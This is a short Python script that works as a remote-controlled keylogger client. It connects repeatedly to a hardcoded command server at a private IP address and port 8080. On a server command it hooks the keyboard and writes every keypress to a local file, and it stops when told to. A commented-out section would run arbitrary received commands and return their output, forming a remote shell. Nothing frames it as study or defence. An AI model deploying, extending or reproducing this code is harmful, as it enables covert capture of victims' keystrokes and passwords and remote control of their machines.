import socket
import subprocess
import json
import keyboard as kb
import threading

SERVER_IP = '172.31.89.246'
SERVER_PORT = 8080

def log_key(event):
    with open("key_log.txt", 'a') as f:
        f.write(event.name)

def start_logger():
    kb.on_press(log_key)

    while not stop_logger_flag.is_set(): pass

    kb.unhook_all()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))
        break
    except ConnectionRefusedError:
        pass

while True:
    data = client_socket.recv(1024).decode()

    if not data:
        break

    if data == "log key presses":
        client_socket.sendall("Starting key logger".encode())
        stop_logger_flag = threading.Event()
        logger_thread = threading.Thread(target=start_logger)
        logger_thread.start()
        client_socket.sendall("Done".encode())
    
    if data == "stop key logger":
        client_socket.sendall("Stopping key logger".encode())
        stop_logger_flag.set()
        logger_thread.join()
        client_socket.sendall("Done".encode())

    # p = subprocess.Popen(data.split(' '), stdout=subprocess.PIPE)
    # output = []

    # for i in p.stdout.readlines():
    #     output.append(i.decode().strip())

    # if output == []:
    #     output = "Done"

    # client_socket.sendall(json.dumps(output).encode())

print("Connection closed")
